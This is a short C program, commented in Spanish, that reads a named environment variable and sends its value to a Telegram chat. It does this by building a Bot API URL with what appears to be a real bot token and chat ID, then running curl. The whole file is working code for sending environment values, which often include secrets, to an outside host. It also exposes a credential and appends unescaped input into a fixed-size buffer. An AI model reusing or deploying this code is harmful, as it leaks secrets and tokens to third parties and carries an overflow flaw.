#include <stdlib.h>
#include <unistd.h>
#include <string.h>

// RECIBE EL NOMBRE DE UNA VARIABLE DE ENTORNO
// COMO ARGUMENTO Y ENVÍA SU VALOR A TELEGRAM

int main(int argc, char *argv[])
{
    char api_url[250] = "https://api.telegram.org/bot5737142449:AAFfblY1GmUIW_ZT3-F9YXhOJNVm1acYD0A/sendMessage?chat_id=-732764355&text=Variable:";
    strcat(api_url, getenv(argv[1]));
    execl("/bin/curl", "curl", api_url, NULL);
    return 0;
}